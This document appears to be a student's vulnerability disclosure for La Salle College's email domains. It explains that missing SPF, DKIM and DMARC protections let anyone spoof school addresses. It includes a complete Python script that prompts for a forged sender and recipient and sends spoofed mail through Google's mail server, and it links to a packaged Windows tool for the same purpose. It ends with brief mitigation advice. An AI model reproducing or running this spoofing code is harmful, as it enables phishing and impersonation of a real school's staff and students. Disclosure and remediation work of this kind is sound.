## What is the Vulnerability?
The vulnerability is at the College's email system, as La Salle College is using a "No Authorization" SMTP server (aspmx.l.google.com);
With the school WiFi, anyone can easily write an email from any valid email address under [lsc.hk](http://lsc.hk/) or [lasalle.edu.hk](http://lasalle.edu.hk/) and send it to anyone with an email address.
## What can the Vulnerability acheive?
As illustrated above, the exploit allows attackers to spoof any email address under the domain [lsc.hk](http://lsc.hk/) and [lasalle.edu.hk](http://lasalle.edu.hk/), e.g. [test@lsc.hk](mailto:test@lsc.hk).
## How to execute the Vulnerability?
Windows Version: [Sendemail (Only in LSC, beta).zip](https://github.com/user-attachments/files/17656203/Sendemail.Only.in.LSC.beta.zip)

Python Version (Demonstration only):
```
import smtplib
from email.mime.text import MIMEText

username = "test@lasalle.edu.hk"

fake_from = input("Enter the email address which you would like to pretent: ")

fake_name = input("Enter the name which you would like to pretent: ")

to_email = input("Enter the email address of the recipient: ")

to_name = input("Enter the name of the recipient: ")

subject = input("Subject of email: ")

# Replace '\n' with actual line breaks in HTML
content = input("Content of email (use '\\n' for line breaks): ").replace('\\n', '<br>')

# Create the HTML message
message = MIMEText(content, 'html')
message['From'] = f"{fake_name} <{fake_from}>"
message['To'] = f"{to_name} <{to_email}>"
message['Subject'] = subject

# Connect to the server and send the email
server = smtplib.SMTP("aspmx.l.google.com", 25)
server.starttls()
server.sendmail(username, to_email, message.as_string())
server.close()
```
## Who discovered the Vulnerability?
The flaw is found by Lee Perseus Robin (2G - 16) and others improved his Python code to support new lines.

## How to fix the Vulnerability?
To temporarily mitigate these types of attacks, the school can implement the following measures:
1. Blocking Port 25 on all networks
2. Fix the SPF, DKIM and DMARC issues in the DNS system of the school's domain(s).
For a permanent solution, I recommend consulting a penetration tester to conduct a comprehensive security assessment of the school's systems.
